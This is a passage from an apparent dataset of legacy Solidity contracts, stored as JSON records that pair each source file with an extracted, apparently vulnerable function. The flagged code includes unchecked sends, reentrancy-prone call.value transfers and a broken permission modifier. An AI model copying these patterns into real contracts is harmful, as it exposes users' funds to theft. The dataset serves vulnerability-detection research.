proposedWithdrawal;\n }\n}\ncontract Slot is usingOraclize, EmergencyWithdrawalModule, DSMath {\n uint constant INVESTORS_EDGE = 200;\n uint constant HOUSE_EDGE = 50;\n uint constant CAPITAL_RISK = 250;\n uint constant MAX_SPINS = 16;\n uint minBet = 1 wei;\n struct SpinsContainer {\n address playerAddress;\n uint nSpins;\n uint amountWagered;\n }\n mapping (bytes32 => SpinsContainer) spins;\n uint[] public probabilities;\n uint[] public multipliers;\n uint public totalAmountWagered;\n event LOG_newSpinsContainer(bytes32 myid, address playerAddress, uint amountWagered, uint nSpins);\n event LOG_SpinExecuted(bytes32 myid, address playerAddress, uint spinIndex, uint numberDrawn);\n event LOG_SpinsContainerInfo(bytes32 myid, address playerAddress, uint netPayout);\n LedgerProofVerifyI externalContract;\n function Slot(address _verifierAddr) {\n externalContract = LedgerProofVerifyI(_verifierAddr);\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n externalContract.external_oraclize_randomDS_setCommitment(queryId, commitment);\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n assert(externalContract.external_oraclize_randomDS_proofVerify(_proof, _queryId, bytes(_result), oraclize_getNetworkName()));\n _;\n }\n modifier onlyOraclize {\n assert(msg.sender == oraclize_cbAddress());\n _;\n }\n modifier onlyIfSpinsExist(bytes32 myid) {\n assert(spins[myid].playerAddress != address(0x0));\n _;\n }\n function isValidSize(uint _amountWagered)\n constant\n returns(bool) {\n uint netPotentialPayout = (_amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/ 10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n return ((netPotentialPayout <= maxAllowedPayout) && (_amountWagered >= minBet));\n }\n modifier onlyIfEnoughFunds(bytes32 myid) {\n if (isValidSize(spins[myid].amountWagered)) {\n _;\n }\n else {\n safeSend(spins[myid].playerAddress, spins[myid].amountWagered);\n delete spins[myid];\n return;\n }\n }\n modifier onlyLessThanMaxSpins (uint _nSpins) {\n assert(_nSpins <= MAX_SPINS);\n _;\n }\n modifier onlyIfFair(uint[] _prob, uint[] _payouts) {\n if (_prob.length != _payouts.length) revert();\n uint sum = 0;\n for (uint i = 0; i <_prob.length; i++) {\n sum += _prob[i] * _payouts[i];\n }\n assert(sum == 10000);\n _;\n }\n function()\n payable {\n buySpins(1);\n }\n function buySpins(uint _nSpins)\n payable\n onlyLessThanMaxSpins(_nSpins)\n onlyIfNotStopped {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n if (oraclizeFee/multipliers[0] + oraclizeFee >= msg.value) revert();\n uint amountWagered = msg.value - oraclizeFee;\n uint maxNetPotentialPayout = (amountWagered * (10000 - INVESTORS_EDGE) * multipliers[0])/10000;\n uint maxAllowedPayout = (CAPITAL_RISK * getBankroll())/10000;\n if ((maxNetPotentialPayout <= maxAllowedPayout) && (amountWagered >= minBet)) {\n bytes32 queryId = oraclize_newRandomDSQuery(0, 2*_nSpins, gas);\n spins[queryId] =\n SpinsContainer(msg.sender,\n _nSpins,\n amountWagered\n );\n LOG_newSpinsContainer(queryId, msg.sender, amountWagered, _nSpins);\n totalAmountWagered += amountWagered;\n } else {\n revert();\n }\n }\n function executeSpins(bytes32 myid, bytes randomBytes)\n private\n returns(uint)\n {\n uint amountWon = 0;\n uint numberDrawn = 0;\n uint rangeUpperEnd = 0;\n uint nSpins = spins[myid].nSpins;\n for (uint i = 0; i < 2*nSpins; i += 2) {\n numberDrawn = ((uint(randomBytes[i])*256 + uint(randomBytes[i+1]))*10000)/2**16;\n rangeUpperEnd = 0;\n LOG_SpinExecuted(myid, spins[myid].playerAddress, i/2, numberDrawn);\n for (uint j = 0; j < probabilities.length; j++) {\n rangeUpperEnd += probabilities[j];\n if (numberDrawn < rangeUpperEnd) {\n amountWon += (spins[myid].amountWagered * multipliers[j]) / nSpins;\n break;\n }\n }\n }\n return amountWon;\n }\n function sendPayout(bytes32 myid, uint payout) private {\n if (payout >= spins[myid].amountWagered) {\n investorsLosses += sub(payout, spins[myid].amountWagered);\n payout = (payout*(10000 - INVESTORS_EDGE))/10000;\n }\n else {\n uint tempProfit = add(investorsProfit, sub(spins[myid].amountWagered, payout));\n investorsProfit += (sub(spins[myid].amountWagered, payout)*(10000 - HOUSE_EDGE))/10000;\n safeSend(houseAddress, sub(tempProfit, investorsProfit));\n }\n LOG_SpinsContainerInfo(myid, spins[myid].playerAddress, payout);\n safeSend(spins[myid].playerAddress, payout);\n }\n function __callback(bytes32 myid, string result, bytes _proof)\n onlyOraclize\n onlyIfSpinsExist(myid)\n onlyIfEnoughFunds(myid)\n oraclize_randomDS_proofVerify(myid, result, _proof)\n {\n uint payout = executeSpins(myid, bytes(result));\n sendPayout(myid, payout);\n delete profitDistributed;\n delete spins[myid];\n }\n function setConfiguration(uint[] _probabilities, uint[] _multipliers)\n onlyOwner\n onlyIfFair(_probabilities, _multipliers) {\n oraclize_setProof(proofType_Ledger);\n delete probabilities;\n delete multipliers;\n uint lastProbability = 0;\n uint lastMultiplier = 2**256 - 1;\n for (uint i = 0; i < _probabilities.length; i++) {\n probabilities.push(_probabilities[i]);\n if (lastProbability >= _probabilities[i]) revert();\n lastProbability = _probabilities[i];\n }\n for (i = 0; i < _multipliers.length; i++) {\n multipliers.push(_multipliers[i]);\n if (lastMultiplier <= _multipliers[i]) revert();\n lastMultiplier = _multipliers[i];\n }\n }\n function setMinBet(uint _minBet) onlyOwner {\n minBet = _minBet;\n }\n function getSpinsContainer(bytes32 myid)\n constant\n returns(address, uint) {\n return (spins[myid].playerAddress, spins[myid].amountWagered);\n }\n function getMinAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint gas = _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", gas);\n return minBet + oraclizeFee/multipliers[0] + oraclizeFee;\n }\n function getMaxAmountToWager(uint _nSpins)\n onlyLessThanMaxSpins(_nSpins)\n constant\n returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"random\", _nSpins*ORACLIZE_PER_SPIN_GAS_LIMIT + ORACLIZE_BASE_GAS_LIMIT + safeGas);\n uint maxWage = (CAPITAL_RISK * getBankroll())*10000/((10000 - INVESTORS_EDGE)*10000*multipliers[0]);\n return maxWage + oraclizeFee;\n }\n}",
  "extract_feature": [
    "function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\nbool ret;\naddress addr;\nassembly {\nlet size := mload(0x40)\nmstore(size, hash)\nmstore(add(size, 32), v)\nmstore(add(size, 64), r)\nmstore(add(size, 96), s)\nret := call(3000, 1, 0, size, 128, size, 32)\naddr := mload(size)\n}\nreturn (ret, addr);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162e"
  },
  "filename": "39199.sol",
  "content": "contract BranchWallet {\n address public owner;\n bool public isRightBranch;\n function BranchWallet (address _owner, bool _isRightBranch) {\n owner = _owner;\n isRightBranch = _isRightBranch;\n }\n function () {\n if (!isRightBranch) throw;\n }\n function send (address _to, uint _value) {\n if (!isRightBranch) throw;\n if (msg.sender != owner) throw;\n if (!_to.send (_value)) throw;\n }\n function execute (address _to, uint _value, bytes _data) {\n if (!isRightBranch) throw;\n if (msg.sender != owner) throw;\n if (!_to.call.value (_value)(_data)) throw;\n }\n}\ncontract BranchSender {\n bool public isRightBranch;\n}",
  "extract_feature": [
    "function send (address _to, uint _value) {\nif (!isRightBranch) throw;\nif (msg.sender != owner) throw;\nif (!_to.send (_value)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb162f"
  },
  "filename": "39268.sol",
  "content": "pragma solidity ^0.4.9;\ncontract TownCrier {\n struct Request {\n address requester;\n uint fee;\n address callbackAddr;\n bytes4 callbackFID;\n bytes32 paramsHash;\n }\n event Upgrade(address newAddr);\n event Reset(uint gas_price, uint min_fee, uint cancellation_fee);\n event RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData);\n event DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData);\n event Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag);\n address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593;\n uint public GAS_PRICE = 5 * 10**10;\n uint public MIN_FEE = 30000 * GAS_PRICE;\n uint public CANCELLATION_FEE = 25000 * GAS_PRICE;\n uint public constant CANCELLED_FEE_FLAG = 1;\n uint public constant DELIVERED_FEE_FLAG = 0;\n int public constant FAIL_FLAG = -2 ** 250;\n int public constant SUCCESS_FLAG = 1;\n bool public killswitch;\n bool public externalCallFlag;\n uint64 public requestCnt;\n uint64 public unrespondedCnt;\n Request[2**64] public requests;\n int public newVersion = 0;\n function () {}\n function TownCrier() public {\n requestCnt = 1;\n requests[0].requester = msg.sender;\n killswitch = false;\n unrespondedCnt = 0;\n externalCallFlag = false;\n }\n function upgrade(address newAddr) {\n if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n newVersion = -int(newAddr);\n killswitch = true;\n Upgrade(newAddr);\n }\n }\n function reset(uint price, uint minGas, uint cancellationGas) public {\n if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n GAS_PRICE = price;\n MIN_FEE = price * minGas;\n CANCELLATION_FEE = price * cancellationGas;\n Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);\n }\n }\n function suspend() public {\n if (msg.sender == requests[0].requester) {\n killswitch = true;\n }\n }\n function restart() public {\n if (msg.sender == requests[0].requester && newVersion == 0) {\n killswitch = false;\n }\n }\n function withdraw() public {\n if (msg.sender == requests[0].requester && unrespondedCnt == 0) {\n if (!requests[0].requester.call.value(this.balance)()) {\n throw;\n }\n }\n }\n function request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) {\n if (externalCallFlag) {\n throw;\n }\n if (killswitch) {\n externalCallFlag = true;\n if (!msg.sender.call.value(msg.value)()) {\n throw;\n }\n externalCallFlag = false;\n return newVersion;\n }\n if (msg.value < MIN_FEE) {\n externalCallFlag = true;\n if (!msg.sender.call.value(msg.value)()) {\n throw;\n }\n externalCallFlag = false;\n return FAIL_FLAG;\n } else {\n uint64 requestId = requestCnt;\n requestCnt++;\n unrespondedCnt++;\n bytes32 paramsHash = sha3(requestType, requestData);\n requests[requestId].requester = msg.sender;\n requests[requestId].fee = msg.value;\n requests[requestId].callbackAddr = callbackAddr;\n requests[requestId].callbackFID = callbackFID;\n requests[requestId].paramsHash = paramsHash;\n RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);\n return requestId;\n }\n }\n function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {\n if (msg.sender != SGX_ADDRESS ||\n requestId <= 0 ||\n requests[requestId].requester == 0 ||\n requests[requestId].fee == DELIVERED_FEE_FLAG) {\n return;\n }\n uint fee = requests[requestId].fee;\n if (requests[requestId].paramsHash != paramsHash) {\n return;\n } else if (fee == CANCELLED_FEE_FLAG) {\n SGX_ADDRESS.send(CANCELLATION_FEE);\n requests[requestId].fee = DELIVERED_FEE_FLAG;\n unrespondedCnt--;\n return;\n }\n requests[requestId].fee = DELIVERED_FEE_FLAG;\n unrespondedCnt--;\n if (error < 2) {\n SGX_ADDRESS.send(fee);\n } else {\n externalCallFlag = true;\n requests[requestId].requester.call.gas(2300).value(fee)();\n externalCallFlag = false;\n }\n uint callbackGas = (fee - MIN_FEE) / tx.gasprice;\n DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData);\n if (callbackGas > msg.gas - 5000) {\n callbackGas = msg.gas - 5000;\n }\n externalCallFlag = true;\n requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData);\n externalCallFlag = false;\n }\n function cancel(uint64 requestId) public returns (int) {\n if (externalCallFlag) {\n throw;\n }\n if (killswitch) {\n return 0;\n }\n uint fee = requests[requestId].fee;\n if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {\n requests[requestId].fee = CANCELLED_FEE_FLAG;\n externalCallFlag = true;\n if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {\n throw;\n }\n externalCallFlag = false;\n Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);\n return SUCCESS_FLAG;\n } else {\n Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1);\n return FAIL_FLAG;\n }\n }\n}",
  "extract_feature": [
    "function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {\nif (msg.sender != SGX_ADDRESS ||\nrequestId <= 0 ||\nrequests[requestId].requester == 0 ||\nrequests[requestId].fee == DELIVERED_FEE_FLAG) {\nreturn;\n}\nuint fee = requests[requestId].fee;\nif (requests[requestId].paramsHash != paramsHash) {\nreturn;\n} else if (fee == CANCELLED_FEE_FLAG) {\nSGX_ADDRESS.send(CANCELLATION_FEE);\nrequests[requestId].fee = DELIVERED_FEE_FLAG;\nunrespondedCnt--;\nreturn;\n}\nrequests[requestId].fee = DELIVERED_FEE_FLAG;\nunrespondedCnt--;\nif (error < 2) {\nSGX_ADDRESS.send(fee);\n} else {\nexternalCallFlag = true;\nrequests[requestId].requester.call.gas(2300).value(fee)();\nexternalCallFlag = false;\n}\nuint callbackGas = (fee - MIN_FEE) / tx.gasprice;\nDeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData);\nif (callbackGas > msg.gas - 5000) {\ncallbackGas = msg.gas - 5000;\n}\nexternalCallFlag = true;\nrequests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData);\nexternalCallFlag = false;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1630"
  },
  "filename": "39662.sol",
  "content": "pragma solidity ^0.4.8;\ncontract IElectricCharger {\n function setInvestors(uint[] ids,address[] addresses,uint[] balances,uint investmentsCount);\n function getPrice() constant external returns (uint price);\n}\ncontract ElectricQueue {\n address public Owner;\n uint public syncDate;\n uint public InvestmentsCount;\n uint public ChargersCount;\n Investment[] Investments;\n uint[] ChargersIds ;\n mapping (uint=>Charger) Chargers;\n address public Proxy;\n address public Manager;\n struct Charger{\n IElectricCharger Address;\n bool IsActive;\n }\n struct Investment {\n uint InvestmentId;\n address Address;\n uint ChargerId;\n uint Balance;\n uint TotalSum;\n bool IsTransfered;\n uint LastUpdateDate;\n bool IsReturned;\n }\n function ElectricQueue(address proxy){\n Owner = msg.sender;\n syncDate = now;\n Proxy = proxy;\n }\n function setManager(address manager) external{\n if (msg.sender != Owner) return ;\n Manager = manager;\n }\n function getChargers() external constant returns (uint [] chargers ,address[] addresses ,bool [] states) {\n uint length = ChargersIds.length;\n address [] memory _addresses = new address[](length);\n bool [] memory _states = new bool[](length);\n for(uint i = 0 ; i < ChargersIds.length;i++){\n _addresses[i] = Chargers[ChargersIds[i]].Address;\n _states[i] = Chargers[ChargersIds[i]].IsActive;\n }\n return (ChargersIds,_addresses,_states);\n }\n function createInvestment(address _address,uint _chargerId) internal returns (Investment investor) {\n checkCharger(_chargerId);\n InvestmentsCount++;\n Investment memory _newInvestment;\n _newInvestment.Address = _address;\n _newInvestment.ChargerId = _chargerId;\n _newInvestment.InvestmentId = InvestmentsCount;\n Investments.push(_newInvestment);\n return _newInvestment;\n }\n function investInQueue(address _from , uint _charger) payable returns(bool success) {\n var investmentId = getInvestment(_from,_charger);\n Investments[investmentId-1].Balance+=msg.value;\n Investments[investmentId-1].TotalSum+=msg.value;\n Investments[investmentId-1].IsTransfered=false;\n Investments[investmentId-1].IsReturned=false;\n Investments[investmentId-1].LastUpdateDate =now;\n syncDate = now;\n return true;\n }\n function checkCharger(uint _chargerId) internal{\n if(!Chargers[_chargerId].IsActive ){\n Chargers[_chargerId].IsActive = true;\n ChargersIds.push(_chargerId);\n ChargersCount++;\n }\n }\n function getInvestment(address _address,uint _charger) internal returns (uint investmentId ) {\n for(uint i =0 ; i < InvestmentsCount ; i++){\n if(Investments[i].Address ==_address && Investments[i].ChargerId == _charger){\n return Investments[i].InvestmentId;\n }\n }\n var _investment = createInvestment(_address,_charger);\n return _investment.InvestmentId;\n }\n function getAllInvestments() external constant returns( uint [] ids , address[] addresses, uint[] chargerIds, uint [] balances , bool [] states , uint[] lastUpdateDates,uint[] totalSum) {\n uint length = InvestmentsCount;\n uint [] memory _ids = new uint[](length);\n address [] memory _addresses = new address[](length);\n uint [] memory _chargerIds = new uint[](length);\n uint [] memory _balances= new uint[](length);\n bool [] memory _states = new bool[](length);\n uint [] memory _lastUpdateDates= new uint[](length);\n uint [] memory _totalSums= new uint[](length);\n for(uint i =0 ; i < InvestmentsCount ; i++){\n _ids[i]= Investments[i].InvestmentId;\n _addresses[i]= Investments[i].Address;\n _chargerIds[i]=Investments[i].ChargerId;\n _balances[i]=Investments[i].Balance;\n _states[i]=Investments[i].IsTransfered;\n _totalSums[i]=Investments[i].TotalSum;\n _lastUpdateDates[i]=Investments[i].LastUpdateDate;\n }\n return(_ids,_addresses,_chargerIds,_balances,_states,_lastUpdateDates,_totalSums);\n }\n function setChargerAddress(uint id , address chargerAddress) {\n if (msg.sender != Owner && msg.sender != Manager) return ;\n Chargers[id].Address = IElectricCharger(chargerAddress);\n }\n function sendToCharger(uint id){\n if (msg.sender != Owner && msg.sender != Manager) return ;\n var _amountForCharger = getAmountForCharger(id);\n uint _priceOfCharger = Chargers[id].Address.getPrice() ;\n if(_priceOfCharger> _amountForCharger){\n uint difference = _priceOfCharger - _amountForCharger;\n calculateCountOfInvestmetnsInQueue(difference,id);\n }\n if(!Chargers[id].Address.call.value(_priceOfCharger)())\n throw;\n }\n function calculateCountOfInvestmetnsInQueue(uint difference ,uint id) internal{\n uint queueInvestments=0;\n uint i =0; uint investmantBalance=0;\n uint length = InvestmentsCount;\n uint [] memory _ids = new uint[](length);\n address [] memory _addresses = new address[](length);\n uint [] memory _balances= new uint[](length);\n while(i <InvestmentsCount && difference > 0){\n if(Investments[i].ChargerId == 0 && Investments[i].Balance >= 1 ether){\n if(difference>Investments[i].Balance){\n investmantBalance=Investments[i].Balance;\n Investments[i].Balance=0;\n Investments[i].IsTransfered =true;\n }\n else{\n investmantBalance=difference ;\n Investments[i].Balance-=difference;\n }\n _ids[queueInvestments]=Investments[i].InvestmentId;\n _addresses[queueInvestments]=Investments[i].Address;\n _balances[queueInvestments]=investmantBalance;\n queueInvestments++;\n }\n i++;\n }\n Chargers[id].Address.setInvestors(_ids,_addresses,_balances,queueInvestments);\n }\n function getAmountForCharger(uint id) internal returns (uint sumBalance) {\n sumBalance = 0;\n uint chargerInvestments=0;\n uint length = InvestmentsCount;\n uint [] memory _ids = new uint[](length);\n address [] memory _addresses = new address[](length);\n uint [] memory _balances= new uint[](length);\n for(uint i =0 ; i < InvestmentsCount ; i++){\n if(Investments[i].ChargerId == id && Investments[i].Balance >= 1 ether){\n _ids[chargerInvestments]=Investments[i].InvestmentId;\n _addresses[chargerInvestments]=Investments[i].Address;\n _balances[chargerInvestments]=Investments[i].Balance;\n sumBalance +=Investments[i].Balance;\n Investments[i].Balance=0;\n Investments[i].IsTransfered = true;\n chargerInvestments++;\n }\n }\n Chargers[id].Address.setInvestors(_ids,_addresses,_balances,chargerInvestments);\n }\n function returnMoney(address _to) payable returns(bool success) {\n if(msg.sender != Proxy) return false;\n for(uint i =0 ; i < InvestmentsCount ; i++){\n if(Investments[i].Address ==_to){\n if(!_to.send(Investments[i].Balance)){\n return false;\n }\n Investments[i].Balance = 0;\n Investments[i].IsReturned= true;\n }\n }\n return true;\n }\n}",
  "extract_feature": [
    "function returnMoney(address _to) payable returns(bool success) {\nif(msg.sender != Proxy) return false;\nfor(uint i =0 ; i < InvestmentsCount ; i++){\nif(Investments[i].Address ==_to){\nif(!_to.send(Investments[i].Balance)){\nreturn false;\n}\nInvestments[i].Balance = 0;\nInvestments[i].IsReturned= true;\n}\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1631"
  },
  "filename": "39684.sol",
  "content": "pragma solidity ^0.4.9;\ncontract EtherprisesLLC {\n address public seriesFactory;\n address public generalManager;\n address[] public series;\n string[] public prose;\n mapping (address => address) public latestSeriesForUser;\n mapping (address => uint) public expiresAt;\n mapping (bytes32 => address) public seriesByName;\n mapping (address => bytes32) public seriesByAddress;\n event AmendmentAdded (string newAmendment);\n event FeePaid (address which);\n event ManagerSet(address newManager);\n event FactorySet(address newFactory);\n event DepositMade(address where, uint amount);\n event SeriesCreated(address addr, uint id);\n function EtherprisesLLC() {\n generalManager = msg.sender;\n }\n modifier ifGeneralManager {\n if (msg.sender != generalManager)\n throw;\n _;\n }\n modifier ifSeries {\n if (expiresAt[msg.sender] == 0)\n throw;\n _;\n }\n function withdraw() ifGeneralManager {\n generalManager.send(this.balance);\n }\n function isExpired(address addr) constant returns (bool) {\n if (expiresAt[addr] > now)\n return false;\n else\n return true;\n }\n function addAmendment(string newAmendment) ifGeneralManager {\n prose.push(newAmendment);\n AmendmentAdded(newAmendment);\n }\n function payFee() ifSeries payable returns (bool) {\n if (msg.value != 1 ether)\n throw;\n expiresAt[msg.sender] += 1 years;\n FeePaid(msg.sender);\n return true;\n }\n function setManager(address newManger) ifGeneralManager {\n generalManager = newManger;\n ManagerSet(newManger);\n }\n function setFactory(address newFactory) ifGeneralManager {\n seriesFactory = newFactory;\n FactorySet(newFactory);\n }\n function createSeries(\n bytes name,\n uint shares,\n string industry,\n string symbol,\n address extraContract\n ) payable returns (\n address seriesAddress,\n uint seriesId\n ) {\n seriesId = series.length;\n var(latestAddress, latestName) = SeriesFactory(seriesFactory).createSeries.value(msg.value)(seriesId, name, shares, industry, symbol, msg.sender, extraContract);\n if (latestAddress == 0)\n throw;\n if (latestName > 0)\n if (seriesByName[latestName] == 0)\n seriesByName[latestName] = latestAddress;\n else\n throw;\n series.push(latestAddress);\n expiresAt[latestAddress] = now + 1 years;\n latestSeriesForUser[msg.sender] = latestAddress;\n seriesByAddress[latestAddress] = latestName;\n SeriesCreated(latestAddress, seriesId);\n return (latestAddress, seriesId);\n }\n function addr(bytes32 _name) constant returns(address o_address) {\n return seriesByName[_name];\n }\n function name(address _owner) constant returns(bytes32 o_name){\n return seriesByAddress[_owner];\n }\n function () payable {\n if (msg.data.length > 0) {\n createSeries(msg.data, 0, \"\", \"\", 0x0);\n } else if (latestSeriesForUser[msg.sender] != 0) {\n if (latestSeriesForUser[msg.sender].call.value(msg.value)())\n DepositMade(latestSeriesForUser[msg.sender], msg.value);\n } else {\n createSeries(\"\", 0, \"\", \"\", 0x0);\n }\n }\n}\ncontract SeriesFactory {\n address public seriesFactory;\n address public owner;\n function createSeries (\n uint seriesId,\n bytes name,\n uint shares,\n string industry,\n string symbol,\n address manager,\n address extraContract\n ) payable returns (\n address addr,\n bytes32 newName\n ) {\n address newSeries;\n bytes32 _newName;\n return (newSeries, _newName);\n }\n}",
  "extract_feature": [
    "function withdraw() ifGeneralManager {\ngeneralManager.send(this.balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1632"
  },
  "filename": "39776.sol",
  "content": "pragma solidity ^0.4.9;\ncontract OrangeGov_Main {\n address public currentContract;\n mapping(address=>mapping(string=>bool)) permissions;\n mapping(address=>mapping(string=>bool)) userStatuses;\n mapping(string=>address) contractIDs;\n mapping(string=>bool) contractIDExists;\n address[] contractArray;\n function OrangeGov_Main () {\n permissions[msg.sender][\"all\"]=true;\n }\n function getHasPermission(address user, string permissionName, string userStatusAllowed) returns (bool hasPermission){\n return permissions[msg.sender][permissionName]||permissions[msg.sender][\"all\"]||userStatuses[msg.sender][userStatusAllowed];\n }\n function getContractByID(string ID) returns (address addr,bool exists){\n return (contractIDs[ID],contractIDExists[ID]);\n }\n modifier permissionRequired(string permissionName,string userStatusAllowed) {\n _;\n if (getHasPermission(msg.sender,permissionName,userStatusAllowed)){\n throw;\n }\n }\n function removeFromContractIDArray(address contractToRemove) {\n for (uint x=0;x<contractArray.length-1;x++) {\n if (contractArray[x]==contractToRemove) {\n contractArray[x]=contractArray[contractArray.length-1];\n contractArray.length--;\n return;\n }\n }\n }\n function addContract(string ID,bytes code) permissionRequired(\"addContract\",\"\"){\n address addr;\n assembly {\n addr := create(0,add(code,0x20), mload(code))\n jumpi(invalidJumpLabel,iszero(extcodesize(addr)))\n }\n address oldAddr = contractIDs[ID];\n contractIDs[ID]=addr;\n contractIDExists[ID]=true;\n oldAddr.call.gas(msg.gas)(bytes4(sha3(\"changeCurrentContract(address)\")),addr);\n addr.call.gas(msg.gas)(bytes4(sha3(\"tellPreviousContract(address)\")),oldAddr);\n removeFromContractIDArray(addr);\n contractArray.length++;\n contractArray[contractArray.length-1]=addr;\n }\n function removeContract(string ID) permissionRequired(\"removeContract\",\"\"){\n contractIDExists[ID]=false;\n contractIDs[ID].call.gas(msg.gas)(bytes4(sha3(\"changeCurrentContract(address)\")),currentContract);\n removeFromContractIDArray(contractIDs[ID]);\n }\n function update(bytes code) permissionRequired(\"update\",\"\"){\n address addr;\n assembly {\n addr := create(0,add(code,0x20), mload(code))\n jumpi(invalidJumpLabel,iszero(extcodesize(addr)))\n }\n addr.call.gas(msg.gas)(bytes4(sha3(\"tellPreviousContract(address)\")),currentContract);\n currentContract = addr;\n for (uint x=0;x<contractArray.length-1;x++) {\n contractArray[x].call.gas(msg.gas)(bytes4(sha3(\"changeMain(address)\")),currentContract);\n }\n }\n function tellPreviousContract(address prev) {\n }\n function spendEther(address addr, uint256 weiAmt) permissionRequired(\"spendEther\",\"\"){\n if (!addr.send(weiAmt)) throw;\n }\n function givePermission(address addr, string permission) permissionRequired(\"givePermission\",\"\"){\n if (getHasPermission(msg.sender,permission,\"\")){\n permissions[addr][permission]=true;\n }\n }\n function removePermission(address addr, string permission) permissionRequired(\"removePermission\",\"\"){\n permissions[addr][permission]=false;\n }\n}",
  "extract_feature": [
    "function spendEther(address addr, uint256 weiAmt) permissionRequired(\"spendEther\",\"\"){\nif (!addr.send(weiAmt)) throw;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1633"
  },
  "filename": "39790.sol",
  "content": "contract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HumanStandardToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb1634"
  },
  "filename": "39912.sol",
